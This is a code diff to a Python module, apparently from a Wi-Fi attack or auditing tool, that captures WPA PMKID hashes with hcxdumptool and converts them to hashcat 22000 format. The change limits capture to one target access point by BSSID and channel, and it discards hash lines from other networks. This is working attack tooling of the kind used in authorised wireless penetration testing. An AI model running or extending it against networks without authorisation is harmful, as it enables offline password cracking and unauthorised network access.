@@ -29,15 +29,27 @@ def capture(mon, target, req, emit, stop_flag):
                         bssid.replace(":", "")))
     pcapng = base + ".pcapng"
     hashfile = base + ".22000"
-    for old in (pcapng, hashfile):
+    for old in (pcapng, hashfile, base + ".filter"):
         try:
             os.remove(old)
         except OSError:
             pass
 
     timeout = config.opt_int(req.timing, "WPA Timeout", 300)
-    cmd = [tools.HCXDUMP, "-i", mon, "-w", pcapng,
-           "--enable_status=1"]
+    channel = str(target.get("channel") or "")
+    filterlist = base + ".filter"
+    try:
+        with open(filterlist, "w") as f:
+            f.write(bssid.replace(":", "").lower() + "\n")
+    except OSError:
+        filterlist = None
+    cmd = [tools.HCXDUMP, "-i", mon, "-w", pcapng, "--enable_status=1"]
+    if channel:
+        cmd += ["-c", channel]
+    if filterlist:
+        # filtermode=2: only attack APs in the list, i.e. scope the capture
+        # to this target instead of grabbing every PMKID in range.
+        cmd += ["--filterlist=%s" % filterlist, "--filtermode=2"]
     emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                      phase="PMKID", countdown=timeout, cd_max=timeout))
     try:
@@ -64,10 +76,26 @@ def capture(mon, target, req, emit, stop_flag):
             except Exception:  # noqa: BLE001
                 pass
 
-    # Convert to a 22000 hash; success = a non-empty hash file.
+    # Convert to a 22000 hash; success = a non-empty hash file that actually
+    # names our target's BSSID (hcxdumptool broadcasts, so without this a
+    # PMKID from an unrelated nearby AP could be mistaken for a hit).
     if os.path.exists(pcapng) and tools.tool_ok(tools.HCXPCAP):
         tools.run([tools.HCXPCAP, "-o", hashfile, pcapng], timeout=30)
     if os.path.exists(hashfile) and os.path.getsize(hashfile) > 0:
+        want = bssid.replace(":", "").lower()
+        matched = []
+        try:
+            with open(hashfile, encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    fields = line.strip().split("*")
+                    if len(fields) > 3 and fields[3].lower() == want:
+                        matched.append(line.strip())
+        except OSError:
+            matched = []
+        if not matched:
+            return {"ok": False, "essid": essid, "bssid": bssid}
+        with open(hashfile, "w") as f:
+            f.write("\n".join(matched) + "\n")
         emit(AttackEvent(EventType.PMKID, essid=essid, bssid=bssid))
         return {"ok": True, "hash": hashfile, "essid": essid, "bssid": bssid}
     return {"ok": False, "essid": essid, "bssid": bssid}
